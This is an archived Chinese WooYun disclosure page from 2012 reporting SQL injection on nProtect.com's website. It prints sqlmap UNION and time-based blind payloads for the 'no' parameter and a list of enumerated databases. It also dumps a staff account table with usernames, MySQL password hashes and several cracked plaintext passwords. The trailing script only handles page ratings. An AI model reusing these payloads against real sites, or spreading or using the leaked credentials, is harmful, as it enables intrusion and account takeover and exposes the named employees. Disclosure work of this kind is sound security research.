<!doctype html>
                        <html lang="en">
                        <head>
	                        <meta charset="UTF-8">
	                        <title>		nProtect.com 官网存在SQL注射漏洞  </title>
	                        <link href="../css/css.css" rel="stylesheet" /> 
                        </head>
                        <body> 
                        <ul><li>标题：		nProtect.com 官网存在SQL注射漏洞  </li><li>作者：		<a href="http://www.wooyun.org/whitehats/教主">教主</a> 
</li><li>提交时间：		2012-09-11 18:39</li></ul>
                        <div class="con">
                        <h2>漏洞详情</h2>
		<h3 class="detailTitle">披露状态：</h3>
		<p class="detail" style="padding-bottom:0">
					</p>
		<p class="detail">
									2012-09-11：	积极联系厂商并且等待厂商认领中，细节不对外公开<br/>
									2012-09-11：	厂商已经主动忽略漏洞，细节向公众公开<br/>
					</p>
		<h3 class="detailTitle">简要描述：</h3>

		<p class="detail">nProtect 产品有:nProtect GameGuard 和 Anti-Virus.其中 nProtect GameGuard 是非常广泛应用的游戏保护系统。具有防外挂、防盗号等功能。也许可以让游戏启动时更新木马文件。</p>

				
						<h3 class="detailTitle">详细说明：</h3>
		
			<p class="detail">就是SQL注射嘛。有什么好讲的~<br />
<br />
<br />
<br />
</p><pre><code>Place: GET<br />
Parameter: no<br />
    Type: UNION query<br />
    Title: MySQL UNION query (NULL) - 12 columns<br />
    Payload: mode=vaccine_view&amp;subpage=4&amp;no=293 LIMIT 1,1 UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, CONCAT(0x3a646b633a,0x66504946797544685262,0x3a6762703a), NULL, NULL, NULL, NULL, NULL, NULL#&amp;page=2&amp;field=&amp;field_value=<br />
<br />
    Type: AND/OR time-based blind<br />
    Title: MySQL &gt; 5.0.11 AND time-based blind<br />
    Payload: mode=vaccine_view&amp;subpage=4&amp;no=293 AND SLEEP(5)&amp;page=2&amp;field=&amp;field_value=<br />
---<br />
available databases [15]:<br />
[*] defenstick<br />
[*] eng_db<br />
[*] faq<br />
[*] homeDB<br />
[*] inca_home<br />
[*] information_schema<br />
[*] mysql<br />
[*] nprotect_manager<br />
[*] nprotect_stats<br />
[*] nsc<br />
[*] page_log<br />
[*] service<br />
[*] SMB<br />
[*] STATISTICS<br />
[*] test</code></pre><p class='detail'> </p>
				
									<h3 class="detailTitle">漏洞证明：</h3>

			<p class="detail"></p><pre><code>member_id,member_pw,member_team,member_name,member_position<br />
choihk,*9E48EED2D62CADCAC04211F84D50D619C33237E4 (9600),0137,斓滍槃攴?0139<br />
yjo,*AB6883620813DC2516BE1C5F5847D51078787A0A (1112),&lt;blank&gt;,鞓れ棸歆?0179<br />
lkh,*0FFA4AF1460EB2A79D58F12D48431800842277A2 (0808),&lt;blank&gt;,鞚搓磻頋?0180<br />
ojs,*81CD330F72C934C3C857CA31384939F43A20B90D (9999),&lt;blank&gt;,鞓れ靾?0178<br />
hhlee,*30667F97C9B42FAF755D7FD520A3893B8A267691,&lt;blank&gt;,鞚错槃頋?0178<br />
inca00,*5C65371FF64F0E78A7A51C52C77D73B53E2F1CB6,&lt;blank&gt;,順勳劚鞎?0179<br />
jinisuno,*23AE809DDACAF96AF0FD78ED04B6A265E05AA257 (123),&lt;blank&gt;,鞚挫劆順?0179<br />
dhlee,*90AFC61E5C80C02BAB4C0AE5C190EA22DE7F0B24,&lt;blank&gt;,鞚措彊順?0176<br />
hjung,*F46A6FB37DD0177AE4F5AD25DEB0303BE9420D68,&lt;blank&gt;,鞝曧泩,0178<br />
jyh,*68FF788913FDE3A59FF17846C6FE2C438E33C1A7,&lt;blank&gt;,欤检榿頋?0139<br />
ytkang,*0DE7898DED55349FE79BCEA99AF2178CAB5EFB5D,&lt;blank&gt;,臧曥棸韮?0179<br />
goojabum,*4BBD81F4555290E2BF17096655A03EDD64B76D8B,&lt;blank&gt;,甑瀽氩?0178<br />
hsshin,*23AE809DDACAF96AF0FD78ED04B6A265E05AA257 (123),&lt;blank&gt;,鞁犿潿靹?0179<br />
choidk,*23AE809DDACAF96AF0FD78ED04B6A265E05AA257 (123),&lt;blank&gt;,斓滊彊甓?0180<br />
bskim,*23AE809DDACAF96AF0FD78ED04B6A265E05AA257 (123),&lt;blank&gt;,旯€氤戩劖,0177<br />
smyu,*23AE809DDACAF96AF0FD78ED04B6A265E05AA257 (123),&lt;blank&gt;,鞙犾姽氙?0180<br />
game,*D6CFF1435802A091D736CCC683FE9050E1361A37 (game),&lt;blank&gt;,&lt;blank&gt;,&lt;blank&gt;<br />
chmun,*512D0C4F790A7C919949B08E9973FCDD5195435F,&lt;blank&gt;,氍胳順?&lt;blank&gt;<br />
ihyoocs,*23AE809DDACAF96AF0FD78ED04B6A265E05AA257 (123),&lt;blank&gt;,鞙犾澑順?0179<br />
hrchu,*23AE809DDACAF96AF0FD78ED04B6A265E05AA257 (123),&lt;blank&gt;,欤检劀鞙?0180<br />
hheeyoun,*23AE809DDACAF96AF0FD78ED04B6A265E05AA257 (123),&lt;blank&gt;,頃滍潿鞐?0180<br />
mkjang,*23AE809DDACAF96AF0FD78ED04B6A265E05AA257 (123),&lt;blank&gt;,鞛ル瓴?0180<br />
parkjk,*23AE809DDACAF96AF0FD78ED04B6A265E05AA257 (123),&lt;blank&gt;,氚曥爼攴?0180<br />
analyzer,*7275928CF77E25BDACEDA9B1EC4B115ADF040035,&lt;blank&gt;,旯€鞀轨柛,0179<br />
ratm8731,*88B2A5530578A97E8F20751B9A82725B5AFB7358 (pantera),&lt;blank&gt;,瓿奠攴?0179<br />
mayrain,*5A16E92B52E4F87A2A88ED9B0508E90A11B4526E,&lt;blank&gt;,氚曧槃,0179<br />
jhshin,*1CC6A155248E468C0D17CBC9C511E7823A269464,&lt;blank&gt;,鞁犾頉?0176<br />
jy,*F337D98B7FC03A22DDE19392E2C46C1353DB0C69 (1qaz),&lt;blank&gt;,鞛レ灛鞓?&lt;blank&gt;<br />
bdkim,*D0FE69064D1A232FBFB9ABFB8FBF2A4EE992050D (8541),&lt;blank&gt;,旯€氤戨張,0177<br />
kckim,*66090900C3F0ACD2138A93BD2BF0FF9DDBC961E2,&lt;blank&gt;,旯€旮办矤,0178<br />
ujin,*879E95DF4A5C5718156FCF7A90F8F9ED9B7D24CA,&lt;blank&gt;,鞚挫湢歆?&lt;blank&gt;<br />
incagsc,*DBBCE7429018341E397DF4E6948A7AA6AA86757C,&lt;blank&gt;,鞚错樃鞓?&lt;blank&gt;<br />
ejpark,*23AE809DDACAF96AF0FD78ED04B6A265E05AA257 (123),&lt;blank&gt;,氚曥潃鞝?&lt;blank&gt;<br />
sklee,*00A51F3F48415C7D4E8908980D443C29C69B60C9 (12345),&lt;blank&gt;,鞚挫劆瓴?0180<br />
dev_nosa ,*00E18CC7C2A0D72CC3F598CE418967D662FC8124,&lt;blank&gt;,氚办儊靾?0179<br />
seogh,*C1F95F0645932E4F40BE47A4B33E8B45FBD629E3,&lt;blank&gt;,靹滉磻順?&lt;blank&gt;</code></pre><p class='detail'> </p>

									<h3 class="detailTitle">修复方案：</h3>
			<p class="detail"> </p>
										<h3 class="detailTitle">版权声明：转载请注明来源 <a style="font-weight:normal" href="http://www.wooyun.org/whitehats/教主" title="教主">教主</a>@<a style="font-weight:normal" href="http://www.wooyun.org/bugs/wooyun-2010-012034" title="nProtect.com 官网存在SQL注射漏洞">乌云</a></h3>
		<hr align="center"/>

				
			<h2>漏洞回应</h2>
			
			
									<h3 class="detailTitle">厂商回应：</h3>
										<p class="detail">未能联系到厂商或者厂商积极拒绝</p>
																	
					
		
<hr align="center" />
<script type="text/javascript">
var bugid="12034";
var bugRating="-3";
var myRating="";
var ratingCount="0";



function ShowBugRating(k){
	var ratingItems=$(".myrating span");
	$.each(ratingItems,function(i,n){
		var nk=parseInt($(n).attr("rel"));
		if(nk<=k){
			$(n).addClass("on");
		}else{
			$(n).removeClass("on");
		}
	});
	$(".myrating span").hover(
		function(){
			$("#ratingShow").html($(this).attr("data-title"));
		},
		function(){
			$("#ratingShow").html("");
		}
	);
}
$(document).ready(function(){
	if(myRating==""){
		var ratingItems=$(".myrating span");
		$(".myrating span").hover(
			function(){
				$(this).addClass("hover");
				var k=parseInt($(this).attr("rel"));
				$.each(ratingItems,function(i,n){
					var nk=parseInt($(n).attr("rel"));
					if(nk<k) $(n).addClass("on");
					if(nk>k) $(n).removeClass("on");
				});
				$("#ratingShow").html($(this).attr("data-title"));
			},
			function(){
				$(this).removeClass("hover");
				if($("#myRating").val()==""){
					$.each(ratingItems,function(i,n){
						$(n).removeClass("on");
					});
				}
				$("#ratingShow").html("");
			}
		);

		$(".myrating span").click(function(){
			var rating=$(this).attr("rel");
			var k=parseInt($(this).attr("rel"));
			$.post("/ajaxdo.php?module=bugrating",{"id":bugid,"rating":rating,"token":$("#token").val()},function(re){
				//消除操作绑定
				$(".myrating span").unbind();
				re=parseInt(re);
				switch(re){
					case 1:
						$("#ratingShow").html("评分成功");
						$("#ratingSpan").html(parseInt($("#ratingSpan").html())+1);
						$.each(ratingItems,function(i,n){
							var nk=parseInt($(n).attr("rel"));
							if(nk<=k){
								$(n).addClass("on");
							}else{
								$(n).removeClass("on");
							}
						});
						ShowBugRating(rating);
						break;
					case 2:
						$("#ratingShow").html("请先登录");
						break;
					case 4:
						$("#ratingShow").html("已对此漏洞进行过评分");
						break;
					case 6:
						$("#ratingShow").html("不能对自己发布的漏洞进行评分");
						break;
					default:break;
				}
			});
		});
	}else{
		if(ratingCount>2){
			ShowBugRating(bugRating);
		}else{
			ShowBugRating(-3);
		}
	}
});

</script>
<h3 class="detailTitle">漏洞评价：</h3>
                        </div>
                        </body>
                        </html>
